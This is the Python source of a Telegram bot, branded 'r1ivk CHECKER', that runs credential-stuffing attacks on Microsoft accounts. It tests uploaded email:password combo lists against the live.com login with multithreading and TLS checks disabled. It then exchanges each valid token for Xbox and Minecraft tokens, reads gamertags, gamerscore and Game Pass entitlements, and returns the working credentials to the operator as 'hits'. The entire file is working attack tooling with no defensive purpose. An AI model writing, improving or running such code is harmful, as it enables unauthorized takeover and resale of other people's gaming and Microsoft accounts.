import os, re, time, threading, requests, urllib3
from urllib.parse import urlparse, parse_qs
import telebot
from telebot import types

urllib3.disable_warnings()

# =================== CONFIG ===================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
OWNER_ID  = int(os.environ.get("OWNER_ID", "6266959915"))

if not BOT_TOKEN:
    print("❌ ERROR: BOT_TOKEN environment variable is not set!")
    print("👉 Set it in Railway → Variables → BOT_TOKEN")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# =================== SESSIONS ===================
sessions = {}
lock = threading.Lock()

def get_session(cid):
    with lock:
        if cid not in sessions:
            sessions[cid] = {
                "hits": [], "checked": 0, "total": 0,
                "hits_count": 0, "bad": 0, "twofa": 0, "errors": 0,
                "gp": 0, "mc": 0, "gs": 0,
                "running": False, "stop": False,
                "start": 0, "msg_id": None, "lk": threading.Lock()
            }
        return sessions[cid]

# =================== EXTRACTORS ===================
def extract_ppft(t):
    for p in [r'name="PPFT"[^>]*value="([^"]+)"', r'"PPFT":"([^"]+)"']:
        m = re.search(p, t, re.I)
        if m:
            return m.group(1).replace('\\/', '/').replace('\\"', '"')
    return None

def extract_urlpost(t):
    for p in [r'"urlPost":"([^"]+)"', r"urlPost:'([^']+)'"]:
        m = re.search(p, t, re.I)
        if m:
            return m.group(1).replace('\\/', '/')
    return None

# =================== CHECKER ===================
def check_one(combo, cid):
    s = get_session(cid)
    if s["stop"]:
        return
    if ":" not in combo:
        with s["lk"]:
            s["bad"] += 1
            s["checked"] += 1
        return
    email, pwd = combo.split(":", 1)
    email = email.strip()
    pwd = pwd.strip()

    r = requests.Session()
    r.verify = False
    r.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
    })

    try:
        url = ("https://login.live.com/oauth20_authorize.srf"
               "?client_id=00000000402B5328"
               "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
               "&scope=service::user.auth.xboxlive.com::MBI_SSL"
               "&display=touch&response_type=token&locale=en")
        g = r.get(url, timeout=20)
        ppft = extract_ppft(g.text)
        post = extract_urlpost(g.text)
        if not ppft or not post:
            with s["lk"]:
                s["bad"] += 1
                s["checked"] += 1
            return

        data = {"login": email, "loginfmt": email, "passwd": pwd,
                "PPFT": ppft, "type": "11", "NewUser": "1",
                "LoginOptions": "3", "i19": "0"}
        h = {"Content-Type": "application/x-www-form-urlencoded",
             "Referer": url, "Origin": "https://login.live.com"}
        lr = r.post(post, data=data, headers=h, allow_redirects=True, timeout=20)

        tok = None
        lt = lr.text.lower()
        if "access_token" in lr.url:
            tok = parse_qs(urlparse(lr.url).fragment).get("access_token", [None])[0]
        elif "access_token" in lt:
            m = re.search(r"access_token=([^&\s\"']+)", lt)
            if m:
                tok = m.group(1)
        elif any(x in lt for x in ["password is incorrect", "account doesn't exist",
                                    "passwords don't match"]):
            with s["lk"]:
                s["bad"] += 1
                s["checked"] += 1
            return
        elif any(x in lt for x in ["recover", "verify your identity",
                                    "security challenge", "two-step", "locked"]):
            with s["lk"]:
                s["twofa"] += 1
                s["checked"] += 1
            return

        if not tok:
            with s["lk"]:
                s["bad"] += 1
                s["checked"] += 1
            return

        xb = r.post(
            "https://user.auth.xboxlive.com/user/authenticate",
            json={"Properties": {"AuthMethod": "RPS",
                                 "SiteName": "user.auth.xboxlive.com",
                                 "RpsTicket": tok},
                  "RelyingParty": "http://auth.xboxlive.com",
                  "TokenType": "JWT"},
            headers={"Content-Type": "application/json"},
            timeout=20
        )
        if xb.status_code != 200:
            with s["lk"]:
                s["bad"] += 1
                s["checked"] += 1
            return

        xbt = xb.json()["Token"]
        uhs = xb.json()["DisplayClaims"]["xui"][0]["uhs"]

        gt, gsc, gsi = "N/A", "0", 0
        try:
            xx = r.post(
                "https://xsts.auth.xboxlive.com/xsts/authorize",
                json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbt]},
                      "RelyingParty": "http://xboxlive.com",
                      "TokenType": "JWT"},
                headers={"Content-Type": "application/json"},
                timeout=20
            )
            if xx.status_code == 200:
                pr = r.get(
                    "https://profile.xboxlive.com/users/me/profile/settings"
                    "?settings=Gamertag,Gamerscore",
                    headers={"Authorization": f"XBL3.0 x={uhs};{xx.json()['Token']}",
                             "x-xbl-contract-version": "2"},
                    timeout=20
                )
                if pr.status_code == 200:
                    for st in pr.json().get("profileUsers", [{}])[0].get("settings", []):
                        if st["id"] == "Gamertag":
                            gt = st["value"]
                        if st["id"] == "Gamerscore":
                            gsc = st["value"]
                            try:
                                gsi = int(gsc)
                            except:
                                pass
        except:
            pass

        has_gp, has_mc, gpt, ent = False, False, "", ""
        try:
            xm = r.post(
                "https://xsts.auth.xboxlive.com/xsts/authorize",
                json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbt]},
                      "RelyingParty": "rp://api.minecraftservices.com/",
                      "TokenType": "JWT"},
                headers={"Content-Type": "application/json"},
                timeout=20
            )
            if xm.status_code == 200:
                ma = r.post(
                    "https://api.minecraftservices.com/authentication/login_with_xbox",
                    json={"identityToken": f"XBL3.0 x={uhs};{xm.json()['Token']}"},
                    headers={"Content-Type": "application/json"},
                    timeout=20
                )
                if ma.status_code == 200:
                    mt = ma.json().get("access_token")
                    if mt:
                        e = r.get(
                            "https://api.minecraftservices.com/entitlements/mcstore",
                            headers={"Authorization": f"Bearer {mt}"},
                            timeout=20
                        )
                        if e.status_code == 200:
                            ent = e.text
        except:
            pass

        if "product_game_pass_ultimate" in ent:
            gpt, has_gp = "Game Pass Ultimate", True
        elif "product_game_pass_pc" in ent:
            gpt, has_gp = "PC Game Pass", True
        elif "product_game_pass_console" in ent:
            gpt, has_gp = "Console Game Pass", True
        has_mc = "product_minecraft" in ent

        hit = (f"Email: {email}\nPassword: {pwd}\nGamertag: {gt}\n"
               f"Gamerscore: {gsc}\nMinecraft: {'Yes' if has_mc else 'No'}\n"
               f"Game Pass: {gpt if has_gp else 'No'}")

        with s["lk"]:
            if has_gp:
                s["gp"] += 1
                s["hits_count"] += 1
                s["hits"].append(("gp", hit))
                try:
                    bot.send_message(cid, f"🔥 *GAME PASS HIT!*\n\n`{hit}`")
                except:
                    pass
            elif has_mc:
                s["mc"] += 1
                s["hits_count"] += 1
                s["hits"].append(("mc", hit))
            elif gsi > 0:
                s["gs"] += 1
                s["hits_count"] += 1
                s["hits"].append(("gs", hit))
            else:
                s["bad"] += 1
            s["checked"] += 1

    except Exception:
        with s["lk"]:
            s["errors"] += 1
            s["checked"] += 1
    finally:
        try:
            r.close()
        except:
            pass

# =================== SCANNER ===================
def scan(cid, combos, threads=20):
    s = get_session(cid)
    s["stop"] = False
    i = [0]
    lk = threading.Lock()

    def w():
        while True:
            with lk:
                if s["stop"] or i[0] >= len(combos):
                    return
                c = combos[i[0]]
                i[0] += 1
            check_one(c, cid)

    th = [threading.Thread(target=w, daemon=True) for _ in range(threads)]
    for t in th:
        t.start()

    last = 0
    while any(t.is_alive() for t in th):
        if s["stop"]:
            break
        if time.time() - last >= 5:
            render(cid)
            last = time.time()
        time.sleep(1)
    for t in th:
        t.join(timeout=1)
    s["running"] = False
    render(cid, True)

def render(cid, final=False):
    s = get_session(cid)
    el = time.time() - s["start"] if s["start"] else 1
    cpm = int(s["checked"] / el * 60) if el > 2 else 0
    pct = s["checked"] / s["total"] * 100 if s["total"] else 0
    bar = "█" * int(pct / 5) + "░" * (20 - int(pct / 5))
    txt = (f"⚡ *r1ivk CHECKER* ⚡\n"
           f"━━━━━━━━━━━━━━━━━━━━━━\n"
           f"📊 `{s['checked']}/{s['total']}`\n"
           f"`[{bar}]` *{pct:.1f}%*\n"
           f"━━━━━━━━━━━━━━━━━━━━━━\n"
           f"✅ Hits: `{s['hits_count']}`\n"
           f"🎮 GP: `{s['gp']}` | ⛏ MC: `{s['mc']}` | 🏆 GS: `{s['gs']}`\n"
           f"❌ Bad: `{s['bad']}` | 🔒 2FA: `{s['twofa']}` | ⚠️ Err: `{s['errors']}`\n"
           f"🚀 CPM: `{cpm}`\n"
           f"{'🏁 Done' if final else '⏳ Running...'}")
    try:
        if s["msg_id"]:
            bot.edit_message_text(txt, cid, s["msg_id"])
        else:
            m = bot.send_message(cid, txt)
            s["msg_id"] = m.message_id
    except:
        pass

# =================== HANDLERS ===================
@bot.message_handler(commands=["start"])
def start(m):
    txt = ("⚡ *r1ivk CHECKER* ⚡\n\n"
           "`/check email:pass` — فحص واحد\n"
           "`/file` — رفع ملف كومبو\n"
           "`/stop` — إيقاف\n"
           "`/stats` — الإحصائيات\n"
           "`/hits` — استلام الهيتس\n"
           "`/reset` — تصفير الجلسة\n\n"
           "👑 Owner: r1ivk")
    bot.send_message(m.chat.id, txt)

@bot.message_handler(commands=["check"])
def cmd_check(m):
    a = m.text.split(maxsplit=1)
    if len(a) < 2 or ":" not in a[1]:
        bot.reply_to(m, "❌ `/check email:pass`")
        return
    cid = m.chat.id
    s = get_session(cid)
    s.update({"hits": [], "checked": 0, "total": 1, "hits_count": 0,
              "bad": 0, "twofa": 0, "errors": 0, "gp": 0, "mc": 0, "gs": 0,
              "running": True, "start": time.time(), "msg_id": None})
    threading.Thread(target=scan, args=(cid, [a[1].strip()], 1), daemon=True).start()

@bot.message_handler(commands=["file"])
def cmd_file(m):
    bot.reply_to(m, "📁 ارسل ملف .txt الآن")

@bot.message_handler(content_types=["document"])
def doc(m):
    cid = m.chat.id
    if not m.document.file_name.lower().endswith((".txt", ".csv")):
        bot.reply_to(m, "❌ ملف .txt فقط")
        return
    try:
        fi = bot.get_file(m.document.file_id)
        data = bot.download_file(fi.file_path).decode("utf-8", errors="ignore")
    except Exception as e:
        bot.reply_to(m, f"❌ فشل التحميل: {e}")
        return

    combos = []
    seen = set()
    for line in data.splitlines():
        line = line.strip()
        if ":" not in line or line.startswith("#"):
            continue
        em = line.split(":", 1)[0].lower()
        if em in seen:
            continue
        seen.add(em)
        combos.append(line)

    if not combos:
        bot.reply_to(m, "❌ ملف فارغ")
        return

    s = get_session(cid)
    s.update({"hits": [], "checked": 0, "total": len(combos), "hits_count": 0,
              "bad": 0, "twofa": 0, "errors": 0, "gp": 0, "mc": 0, "gs": 0,
              "running": True, "start": time.time(), "msg_id": None})
    bot.reply_to(m, f"🚀 بدء فحص `{len(combos)}` كومبو")
    threading.Thread(target=scan, args=(cid, combos, 20), daemon=True).start()

@bot.message_handler(commands=["stop"])
def cmd_stop(m):
    s = get_session(m.chat.id)
    if not s["running"]:
        bot.reply_to(m, "⚠️ لا يوجد فحص")
        return
    s["stop"] = True
    s["running"] = False
    bot.reply_to(m, "🛑 تم الإيقاف")

@bot.message_handler(commands=["stats"])
def cmd_stats(m):
    s = get_session(m.chat.id)
    el = time.time() - s["start"] if s["start"] else 1
    cpm = int(s["checked"] / el * 60) if el > 2 else 0
    txt = (f"📊 *Statistics*\n"
           f"━━━━━━━━━━━━━━━━━━━━━━\n"
           f"🔍 `{s['checked']}/{s['total']}`\n"
           f"✅ Hits: `{s['hits_count']}`\n"
           f"🎮 GP: `{s['gp']}` | ⛏ MC: `{s['mc']}` | 🏆 GS: `{s['gs']}`\n"
           f"❌ Bad: `{s['bad']}` | 🔒 2FA: `{s['twofa']}` | ⚠️ Err: `{s['errors']}`\n"
           f"🚀 CPM: `{cpm}`")
    bot.send_message(m.chat.id, txt)

@bot.message_handler(commands=["reset"])
def cmd_reset(m):
    with lock:
        if m.chat.id in sessions:
            del sessions[m.chat.id]
    bot.reply_to(m, "🧹 تم التصفير")

@bot.message_handler(commands=["hits"])
def cmd_hits(m):
    cid = m.chat.id
    s = get_session(cid)
    if not s["hits"]:
        bot.reply_to(m, "❌ لا يوجد هيتس")
        return
    groups = {"gp": [], "mc": [], "gs": []}
    for t, c in s["hits"]:
        groups[t].append(c)
    names = {"gp": ("GamePass_Hits.txt", "🎮 GAME PASS"),
             "mc": ("Minecraft_Hits.txt", "⛏ MINECRAFT"),
             "gs": ("GScore_Hits.txt", "🏆 G-SCORE")}
    sent = False
    for k, lst in groups.items():
        if not lst:
            continue
        sent = True
        fn, title = names[k]
        content = f"# {title} — r1ivk\n\n" + ("\n" + "_" * 55 + "\n").join(lst)
        with open(fn, "w", encoding="utf-8") as f:
            f.write(content)
        with open(fn, "rb") as f:
            bot.send_document(cid, f, caption=f"{title} — {len(lst)} حساب")
    if not sent:
        bot.reply_to(m, "❌ لا يوجد هيتس")

# =================== RUN ===================
if __name__ == "__main__":
    print("⚡ r1ivk CHECKER running...")
    bot.infinity_polling(timeout=30, long_polling_timeout=30)
